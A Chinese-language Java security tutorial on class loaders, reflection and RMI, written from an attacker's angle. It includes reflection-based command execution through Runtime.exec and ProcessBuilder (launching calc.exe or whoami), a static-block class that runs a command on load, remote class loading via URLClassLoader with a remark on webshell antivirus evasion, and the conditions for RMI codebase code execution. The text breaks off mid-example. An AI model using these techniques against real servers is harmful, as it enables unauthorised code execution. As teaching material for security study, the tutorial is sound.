## JAVA安全

### 0.类加载器（ClassLoader）

Java类加载器(Java Classloader)是Java运行时环境(Java Runtime Environment)的一部分，负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。



![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/105531/10/42274/35660/6523701fF8724ec02/2a96e76d1d7ca3cc.jpg)

比如我们创建一个ClassLoaderTest.java文件运行，经过javac编译，然后生成ClassLoaderTest.class文件。这个java文件和生成的class文件都是存储在我们的磁盘当中。但如果我们需要将磁盘中的class文件在java虚拟机内存中运行，需要经过一系列的类的生命周期（加载、连接（验证-->准备-->解析）和初始化操作，最后就是我们的java虚拟机内存使用自身方法区中字节码二进制数据去引用堆区的Class对象。

这个和.Net里的对类加载到程序集类似

1）资源隔离：实现不同项目或者同一个项目上的不同版本的jar包隔离，避免集群错误或者冲突的产生。

2）热部署：热部署就是在运行时更新Java类文件，在基于Java的应用服务器实现热部署的过程中，类装入器扮演着重要的角色。类装入器不能重新装入一个已经装入的类，但只要使用一个新的类装入器实例，就可以将类再次装入一个正在运行的应用程序。这样我们应用正在运行的时候升级软件，却不需要重新启动应用。

3）代码保护：我们可以对字节码文件进行加密，然后再使用特定的ClassLoader解密文件内容，再加载这些字节码文件。这样就能够实现对我们的代码项目加密保护，别人无法进行反编译查看源代码信息。

#### 类加载器分类

大致分为两种，一种是JVM自带的类加载器，分别为引导类加载器、扩展类加载器和系统类加载器。

另外一种就是用户自定义的类加载器，可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。

##### 引导类加载器(BootstrapClassLoader)

引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中。(同时处于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类)。

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/94333/33/40896/18973/652371aeFfc88d699/9f5e84004154aaca.jpg)

##### 扩展类加载器(ExtensionsClassLoader)

扩展类加载器(ExtensionsClassLoader)，由sun.misc.Launcher$ExtClassLoader类实现，用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/10354/40/22804/17318/65237216Fb785b5df/79bb53613688ab58.jpg)

这里我们可以选择一个zipfs.jar包，然后查看下其jar中的ZipPath类加载器，发现存在ExtensionsClassLoader。

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/215140/28/35378/14989/65237234F0b192d30/451f6dceeaa92b1b.jpg)

##### App类加载器/系统类加载器（AppClassLoader）

App类加载器/系统类加载器（AppClassLoader），由sun.misc.Launcher$AppClassLoader实现，一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。通常我们是使用这个加载类来加载Java应用类，可以使用ClassLoader.getSystemClassLoader()来获取它。

这里我们使用本身写的ClassLoaderTest类进行测试，发现存在于AppClassLoader。

![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/106991/14/46542/9657/6523727dF476284c0/760611589bc8cacb.jpg)

##### 自定义类加载器(UserDefineClassLoader)

自定义类加载器(UserDefineClassLoader)，除了上述java自带提供的类加载器，我们还可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器。

#### 双亲委派机制

使用JVM默认三种类加载器进行相互配合使用，且是按需加载方式，就是我们需要使用该类的时候，才会将生成的class文件加载到内存当中生成class对象进行使用，且加载过程使用的是双亲委派模式，及把需要加载的类交由父加载器进行处理。![类加载器的双亲委派模型](https://img12.360buyimg.com/ddimg/jfs/t1/124964/3/39404/28391/65237314Fd8e07547/4deadf396f785b63.jpg)

当上述特定的类加载器接到加载类的请求时，首先会先将任务委托给父类加载器，接着请求父类加载这个类，当父类加载器无法加载时（其目录搜素范围没有找到所需要的类时），子类加载器才会进行加载使用。这样可以避免有些类被重复加载。

#### CLassLoader类核心方法

##### loadClass：加载指定的java类

ClassLoaderExample类

~~~java
import java.lang.reflect.Method;

public class ClassLoaderExample {
    public static void main(String[] args) {
        try {
            // 创建一个新的类加载器
            ClassLoader customClassLoader = new CustomClassLoader();

            // 使用类加载器加载指定类
            Class<?> loadedClass = customClassLoader.loadClass("MyClass");

            // 实例化类的对象
            Object obj = loadedClass.newInstance();

            // 调用类的方法
            Method method = loadedClass.getMethod("sayHello");
            method.invoke(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

CustomClassLoader类

~~~java
class CustomClassLoader extends ClassLoader {
    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        if ("com.example.MyClass".equals(name)) {
            return findClass(name);
        }
        return super.loadClass(name);
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        // 在这里实现自定义的类加载逻辑，例如从文件系统或网络中加载类的字节码
        // 然后使用 defineClass() 方法将字节码转换为类对象

        // 这里只是一个示例，直接返回一个预先编译好的类
        byte[] bytecode = getBytecode();
        return defineClass(name, bytecode, 0, bytecode.length);
    }

    private byte[] getBytecode() {
        // 返回类的字节码内容
        // 这里可以根据需求进行具体实现，例如从文件或网络中读取字节码数据
        return null;
    }
}
~~~

MyClass

~~~java
public class MyClass {
    public void sayHello() {
        System.out.println("Hello from MyClass!");
    }
}
~~~

![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/179530/18/39812/52034/652375e2F5ff93312/b561e4d13c1188e0.jpg)

我们首先分析代码，我们首先创建一个新的类加载器customClassLoader，然后customClassLoader类继承了类加载器类，重写了他的loadclass和findclass方法

![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/90254/1/42302/45440/65237641F471ea316/bb7ce0cfe399cf90.jpg)

下面判断就是如果com.example.MyClass不等于我输入的那个就直接super.loadClass，调用父类的该方法

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/115118/25/35113/50814/65237ab9Fdd9a35d9/2c12fb5f4b3b72f9.jpg)

~~~java
    protected Class<?> loadClass(String name, boolean resolve)
        throws ClassNotFoundException
    {
        synchronized (getClassLoadingLock(name)) {
            // First, check if the class has already been loaded
            Class<?> c = findLoadedClass(name);
            if (c == null) {
                long t0 = System.nanoTime();
                try {
                    if (parent != null) {
                        c = parent.loadClass(name, false);
                    } else {
                        c = findBootstrapClassOrNull(name);
                    }
                } catch (ClassNotFoundException e) {
                    // ClassNotFoundException thrown if class not found
                    // from the non-null parent class loader
                }

                if (c == null) {
                    // If still not found, then invoke findClass in order
                    // to find the class.
                    long t1 = System.nanoTime();
                    c = findClass(name);

                    // this is the defining class loader; record the stats
                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);
                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
                    sun.misc.PerfCounter.getFindClasses().increment();
                }
            }
            if (resolve) {
                resolveClass(c);
            }
            return c;
        }
    }
~~~

首先调用了getClassLoadingLock方法，该方法被用于获取类加载锁，然后`Class<?> c = findLoadedClass(name);`方法，使用了findLoadedClass(String)方法来检查这个类是否被加载过

然后下面就是如果父类的loadClass（String）方法，如果父加载器为null，类加载器加载jvm内置的加载器

![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/105499/13/44251/28036/65237bdaF0227f02d/03e6d6da2a6fe2f2.jpg)

之后就调用findClass(String) 方法装载类

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/195876/22/39621/24230/65237c3eFe2219347/55e36c5915d3a74a.jpg)

##### findCLass：查找指定的Java类

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/135128/11/39802/8589/65237c7eFb25d6955/557519e1c164b134.jpg)

##### findLoadedClass：查找JVM已经加载过的类

上面提到

##### defineClass：定义一个Java类，将字节码解析成虚拟机识别的Class对象。往往和findClass()方法配合使用

~~~java
protected final Class<?> defineClass(byte[] b, int off, int len)
        throws ClassFormatError
    {
        return defineClass(null, b, off, len, null);
    }
~~~

##### resolveClass：链接指定Java类

~~~java
protected final void resolveClass(Class<?> c) {
        resolveClass0(c);
    }

    private native void resolveClass0(Class c);
~~~

##### 自定义类加载器

就是我刚才给出的代码继承classLoader，然后重写其方法，覆盖findClass()方法，在findClass()方法中调用defineClass()方法

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/188327/13/39277/42236/65237d46F9fe1f7ff/a042afd55f5a539c.jpg)

##### URLClassLoader

URLClassLoader类继承ClassLoader类，可以加载本地磁盘和网络中的jar包类文件。

~~~java
public class Test {
    public Test(){
        System.out.println("Test success!!!");
        try{
            Runtime.getRuntime().exec("cmd /c calc.exe");
        }
        catch(Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

使用javac进行编译，在D盘生成对应的class文件`javac Test.java`

修改ClassLoaderTest类，利用URLClassLoader方式去获取D盘中Test.class文件。

~~~java
import java.io.File;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;


public class ClassLoaderTest {
    public static void main(String[] args) throws Exception{
        File file = new File("D:/idea/test");
        URI uri = file.toURI();
        URL url = uri.toURL();

        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
        Class clazz = classLoader.loadClass("Test");
        clazz.newInstance();
    }
}
~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/167435/38/37573/65753/65237f70Feae7a199/cb659e4a75ed589b.jpg)

这个在webshell免杀类加载器也是实用的，这里使用File获取类文件路径，之后使用URLClassLoader获取url地址为D盘，之后使用loadClass方法获取Test.class所含包名，然后实例化。运行发现解析获取到了D盘中Test.class

网络传输class文件调用，你也可以将这种方式放在web下

将Test.class放置到电脑的Tomcat服务器目录下，然后启动Tomcat。之后新建个ClassLoaderDemo类网络加载Tomcat服务器中的Test.class.

~~~java
import java.net.URL;
import java.net.URLClassLoader;

public class ClassLoaderDemo {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://localhost:8080/examples/");
        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
        Class clazz = classLoader.loadClass("Test");
        clazz.newInstance();
    }
}
~~~

这里使用URLClassLoader加载网络中的Tomcat服务器目录，成功解析获取到了目录下的Test.class文件。

使用URLClassLoader加载网络中的Tomcat服务器目录，成功解析获取到了目录下的Test.class文件









### 1.反射

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/40523/36/25729/40548/651ff9d7F829be2f1/c0279f894db01e36.jpg)

如下的代码，main方法中调用了execute方法，传入了当前Main类的名字和一个字符串printNumber，在execute方法中，clazz是通过Class.forName(className)获得Main类的对象，通过clazz.getDeclaredConstructor().newInstance()进而获得了Main类的实例化instance，利用clazz.getMethod调用Main类的printNumber方法，并以instance这个实例化对象执行函数，就输出123

~~~java
public class Main {
    public static void main(String[] args) {
        int number = 123;
        try {
            execute(Main.class.getName(), "printNumber");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void execute(String className, String methodName) throws Exception {
        Class<?> clazz = Class.forName(className);
        Object instance = clazz.getDeclaredConstructor().newInstance();
        clazz.getMethod(methodName).invoke(instance);
    }

    public void printNumber() {
        System.out.println(123);
    }
}
~~~

![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/190310/30/38831/35707/651faadcF9e5fe9e7/e0f14ee28d5d6e0b.jpg)

##### 三种反射

~~~
//obj.getClass() 如果上下⽂文中存在某个类的实例例 obj ，那么我们可以直接通过obj.getClass() 来获取它的类
例如刚才我们增加一句System.out.println(instance.getClass());，输出：class Main
//Test.class 如果你已经加载了了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接
拿它的 class 属性即可。这个⽅方法其实不不属于反射。
System.out.println(Main.class);
//Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤用 forName 来获取
System.out.println(clazz);
~~~

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/163651/8/41854/29704/651fac1cF9d0492e9/ec58df7155e6d880.jpg)

##### 利用反射RCE

~~~java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        try {
            Class<?> runtimeClass = Class.forName("java.lang.Runtime");
            Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");
            Object runtimeObject = getRuntimeMethod.invoke(null);

            Method execMethod = runtimeClass.getMethod("exec", String.class);
            Process process = (Process) execMethod.invoke(runtimeObject, "whoami");

            int exitCode = process.waitFor();
            if (exitCode == 0) {
                // 读取命令输出
                java.io.InputStream inputStream = process.getInputStream();
                java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter("\\A");
                String output = scanner.hasNext() ? scanner.next() : "";
                System.out.println("命令输出：" + output);
            } else {
                System.out.println("命令执行失败");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/116560/5/43945/46790/651faccfFb6bc2a55/bbc2888aa301f621.jpg)

.

forName有两个函数重载

~~~java
Class<?> forName(String name)
Class<?> forName(String name, **boolean** initialize, ClassLoader loader)
~~~

第⼀一个就是我们最常⻅见的获取class的⽅方式，其实可以理理解为第二种⽅方式的⼀一个封装

~~~java
Class.forName(className)
// 等于
Class.forName(className, true, currentLoader)
~~~

 forName 的第⼀一个参数是类名；第⼆二个参数表示是否初始化；第三个参数就是 ClassLoader

Java默认的 ClassLoader 就是根据类名来加载类，这个类名是类完整路路径，如 java.lang.Runtime 。

第二个的initialize是什么作用呢？如下

Main类

~~~java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        try {
            Class<?> trainPrintClass = Class.forName("TrainPrint");
            Object trainPrintObject = trainPrintClass.getDeclaredConstructor().newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

TrainPrint类

~~~java
public class TrainPrint {
    {
        System.out.printf("Empty block initial %s\n", this.getClass());
    }

    static {
        System.out.printf("Static initial %s\n", TrainPrint.class);
    }

    public TrainPrint() {
        System.out.printf("Initial %s\n", this.getClass());
    }
}
~~~

![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/92318/2/37581/14347/651faf70F816203ba/84661ca160232651.jpg)

⾸首先调⽤用的是 static {} ，其次是 {} ，最后是构造函数

 static {} 就是在“类初始化”的时候调⽤用的，⽽ {} 中的代码会放在构造函数的 super() 后⾯面，
但在当前构造函数内容的前⾯面。

所以 forName 中的 initialize=true 其实就是告诉Java虚拟机是否执⾏行行”类初始化“

用如下代码验证

Main类

~~~java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        try {
            Class<?> codeInjectClass = Class.forName("CodeInject");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

CodeInject类

~~~java
public class CodeInject {
    static {
        try {
            Process process = Runtime.getRuntime().exec("whoami");
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                // 读取命令输出
                java.io.InputStream inputStream = process.getInputStream();
                java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter("\\A");
                String output = scanner.hasNext() ? scanner.next() : "";
                System.out.println("命令输出：" + output);
            } else {
                System.out.println("命令执行失败");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/90564/22/46124/37662/651fb115Fe35e6c39/193acb1b9fbd8cc6.jpg)

而如果我们采用的第二种重载方法，令initialize为false就不会执行，如同下图

~~~java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        try {
            Class<?> codeInjectClass = Class.forName("CodeInject",false,ClassLoader.getSystemClassLoader());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/223434/40/31493/34031/651fb168Faf37802b/32f372f2014ca567.jpg)

.

在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。

 $ 的作用是查找内部类。Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName("C1$C2") 即可加载这个内部类。

如代码

~~~java
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) {
        InnerClass inner = new InnerClass();
        inner.printNumber();
    }

    private static class InnerClass {
        public void printNumber() {
            System.out.println(123);
        }
    }
}
//输出123
~~~

如下，生成了Main$InnerClass.class的字节码文件，获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方法。

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/93503/5/32753/21367/651fb2f6Fd7718dfe/54543faf492c631f.jpg)

如下，class.newInstance() 的作用就是调用这个类的无参构造函数，但是 Runtime 类的构造方法是私有的，这是涉及到了设计模式里面的单例模式，比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到据库的时候再新建立一个连接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取，这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。

~~~java
import java.lang.reflect.InvocationTargetException;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = Class.forName("java.lang.Runtime");
        clazz.getMethod("exec",
                String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "calc.exe");
    }
}
~~~

![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/100063/21/46598/51454/651fb4adF3560af7b/0f0880fb7afffc10.jpg)

我们这里用的exec，exec有6个重载方法

![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/197309/8/36218/26695/651fb53fFe6b45524/f88b568bd9afcee4.jpg)

invoke 的作用是执行方法，它的第一个参数是：
如果这个方法是一个普通方法，那么第一个参数是类对象
如果这个方法是一个静态方法，那么第一个参数是类

~~~java
import java.lang.reflect.InvocationTargetException;
import java.lang.Runtime;
import java.lang.reflect.Method;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {

        Class clazz = Class.forName("java.lang.Runtime");
        Method execMethod = clazz.getMethod("exec", String.class);
        Method getRuntimeMethod = clazz.getMethod("getRuntime");
        Object runtime = getRuntimeMethod.invoke(clazz);
        execMethod.invoke(runtime, "calc.exe");
    }
|
~~~

如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？

如果一个方法或构造方法是私有方法，我们是否能执行它呢？

用到一个新的反射方法 getConstructor 

和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数

获取到构造函数后，我们使用 newInstance 来执行。

比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用start() 来执行命令：

~~~java
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Arrays;
import java.util.List;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        
        Class clazz = Class.forName("java.lang.ProcessBuilder");
        ((ProcessBuilder)
                clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();
    }
}
~~~

或者

~~~java
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Arrays;
import java.util.List;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Class clazz = Class.forName("java.lang.ProcessBuilder");
        clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(
                Arrays.asList("calc.exe")));
    }
}
~~~

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/189849/3/39323/41092/651fba9dF87b21667/312d28bc2e9be05f.jpg)

ProcessBuilder有两个构造函数：
~~~
public ProcessBuilder(List<String> command)
public ProcessBuilder(String... command)
~~~

上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。

通过 getMethod("start") 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是
ProcessBuilder Object了。

如果我们想使用ProcessBuilder的第二个构造函数，定义函数的时候不确定参数数量的时候，可以使用 ... 这样的语法来表示“这个函数的参数个数，可变长参数（varargs）

对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价的（也就不能重载）：

~~~
public void hello(String[] names) {}
public void hello(String...names) {}
~~~

也由此，如果我们有一个数组，想传给hello函数，只需直接传即可：

~~~
String[] names = {"hello", "world"};
hello(names);
~~~

我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二种构造函数：

~~~
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getConstructor(String[].class)
~~~

在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个代码如下：

~~~java
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {

        Class clazz = Class.forName("java.lang.ProcessBuilder");
        ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new
                String[][]{{"calc.exe"}})).start();
    }
}
~~~

如果一个方法或构造方法是私有方法，我们是否能执行它呢？ getDeclared 系列的反射

~~~java
getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法
    
getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了
~~~

前文我们说过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例化对象，进而执行命令：

~~~java
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

public class Main {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {

        Class clazz = Class.forName("java.lang.Runtime");
        Constructor m = clazz.getDeclaredConstructor();
        m.setAccessible(true);
        clazz.getMethod("exec", String.class).invoke(m.newInstance(), "calc.exe");
    }
}
~~~

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/89630/39/42132/47628/651fbd09Ff8001314/3a1a73eb751194a3.jpg)

可见，这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用setAccessible 修改它的作用域，否则仍然不能调用。



### 2.RMI(远程方法调用)

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/134808/27/39800/83680/65238757F13d37b30/4935d1dcb39616fb.jpg)

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/150966/9/33126/18740/651ffaeeF7a042a64/db650185aa550d17.jpg)

~~~
第一步：客户端请求代理
第二步：Stub编码处理消息
第三步：消息传输
第四步：到达管家skeleton并处理信息
第五步：管家skeleton把信息提交给server
第六步：server接收到请求
第七步：server把请求的结果给管家
第八步：管家skeleton把结果转交给stub
第九步：代理Stub对结果解码
第十步：Stub把解码的结果交给client。
~~~

##### 代码实现

1、编写server接口，继承Remote。 2、编写server接口实现类，继承UnicastRemoteObject 类。 3、server创建一个注册表，指定端口。 4、server往注册表中注册server服务。 5、client获取注册表调用远程server方法。

MyRemoteInterface接口类

~~~java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface MyRemoteInterface extends Remote {
    String sayHello() throws RemoteException;
}

~~~

MyClient类

~~~java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class MyClient {
    public static void main(String[] args) {
        try {
            // 连接到RMI注册表并获取远程对象
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
            MyRemoteInterface stub = (MyRemoteInterface) registry.lookup("MyRemoteObject");

            // 调用远程方法
            String result = stub.sayHello();
            System.out.println(result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

MyServer类

~~~java
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class MyServer implements MyRemoteInterface {
    public String sayHello() throws RemoteException {
        return "Hello from server!";
    }

    public static void main(String[] args) {
        try {
            // 创建远程对象
            MyServer server = new MyServer();
            MyRemoteInterface stub = (MyRemoteInterface) UnicastRemoteObject.exportObject(server, 0);

            // 启动RMI注册表，并将远程对象绑定到指定名称
            Registry registry = LocateRegistry.createRegistry(1099);
            registry.bind("MyRemoteObject", stub);

            System.out.println("Server running...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

1）编写server接口，继承Remote：说明这个sayHello方法是可以rmi的

~~~java
public interface MyRemoteInterface extends Remote {
    String sayHello() throws RemoteException;
}
~~~

2.编写server接口实现类，继承UnicastRemoteObject 类

~~~java
    public String sayHello() throws RemoteException {
        return "Hello from server!";
    }
~~~

3.server创建一个注册表，指定端口

~~~java
    public static void main(String[] args) {
        try {
            // 创建远程对象
            MyServer server = new MyServer();
            MyRemoteInterface stub = (MyRemoteInterface) UnicastRemoteObject.exportObject(server, 0);

            // 启动RMI注册表，并将远程对象绑定到指定名称
            Registry registry = LocateRegistry.createRegistry(1099);
            registry.bind("MyRemoteObject", stub);

            System.out.println("Server running...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
~~~

4.server往注册表中注册server服务    5.client获取注册表调用远程server方法

~~~java
public static void main(String[] args) {
        try {
            // 连接到RMI注册表并获取远程对象
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
            MyRemoteInterface stub = (MyRemoteInterface) registry.lookup("MyRemoteObject");

            // 调用远程方法
            String result = stub.sayHello();
            System.out.println(result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
~~~

![image.png](https://img12.360buyimg.com/ddimg/jfs/t1/94552/38/46210/9912/651ffe2dF278ac758/271127b05442c959.jpg)

Hello.java接口类

~~~java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface Hello extends Remote {
    String sayHello() throws RemoteException;
}
~~~



RemoteHelloWorldImpl.java接口实现类

~~~java
import java.rmi.RemoteException;

public class RemoteHelloWorldImpl implements Hello {
    protected RemoteHelloWorldImpl() throws RemoteException {
        super();
    }

    public String sayHello() throws RemoteException {
        return "Hello, World!";
    }
}
~~~



RMIServer.java

~~~java
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.server.UnicastRemoteObject;

public class RMIServer {
    public static void main(String[] args) {
        try {
            // 创建RMI注册表，并指定端口号为1099
            LocateRegistry.createRegistry(1099);

            // 创建远程对象实例
            RemoteHelloWorldImpl remoteObj = new RemoteHelloWorldImpl();

            // 导出远程对象的stub
            Hello stub = (Hello) UnicastRemoteObject.exportObject(remoteObj, 0);

            // 将远程对象绑定到RMI注册表中，供客户端调用
            Naming.bind("rmi://127.0.0.1:1099/Hello", stub);

            System.out.println("RMI Server is running...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~



RMIClient.java

~~~java
import java.rmi.Naming;

public class RMIClient {
    public static void main(String[] args) {
        try {
            // 查找远程对象
            Hello stub = (Hello) Naming.lookup("rmi://127.0.0.1:1099/Hello");

            // 调用远程方法
            String result = stub.sayHello();
            System.out.println(result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

![image.png](https://img13.360buyimg.com/ddimg/jfs/t1/89934/26/43998/40656/6522ae15Fd5cb4294/654bf69e76aa0552.jpg)

客户端直接通过rmi协议找到这个hello，从而调用了这个接口实现类方法

![image.png](https://img14.360buyimg.com/ddimg/jfs/t1/194056/16/39894/22983/6522ae31Fc06cfbd9/689f15cc1dae3460.jpg)

#### RMI攻击

这里由于只有来源地址是localhost的时候，才能调用rebind、bind、unbind等方法。

但是可以调用list和lookup方法

list方法可以列出目标上所有绑定的对象：

~~~java
import java.rmi.Naming;

public class RMIClient {
    public static void main(String[] args) {
        try {
            // 列出指定URL下的所有已绑定对象
            String[] names = Naming.list("rmi://127.0.0.1:1099/");

            // 遍历并打印对象名称
            for (String name : names) {
                System.out.println("Remote object name: " + name);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

![image.png](https://img10.360buyimg.com/ddimg/jfs/t1/163110/21/38860/41728/6522b051F3f977fae/8d78f333920fe5dc.jpg)

lookup作用就是获得某个远程对象

~~~java
import java.rmi.Naming;

public class RMIClient {
    public static void main(String[] args) {
        try {
            // 查找远程对象
            Hello remoteObj = (Hello) Naming.lookup("rmi://127.0.0.1:1099/Hello");

            // 调用远程方法
            String message = remoteObj.sayHello();
            System.out.println("Server response: " + message);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
~~~

![image.png](https://img11.360buyimg.com/ddimg/jfs/t1/67533/18/25848/39945/6522b01bFbe5a1002/b25384823937bdc4.jpg)

#### RMI利用codebase执行任意代码

利用codebase来加载远程类，在RMI服务端执行任意代码，只有满足如下条件的RMI服务器才能被攻击：

安装并配置了SecurityManager

Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false

其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：

https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html

https://www.oracle.com/java/technologies/javase/7u21-relnotes.html

官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的codebase ，不再支持从RMI请求中获取。

ICalc.java

~~~java
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;
public interface ICalc extends Remote {
  public Integer sum(List<Integer> params) throws RemoteException;
}
~~~

Calc.java

~~~java
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;
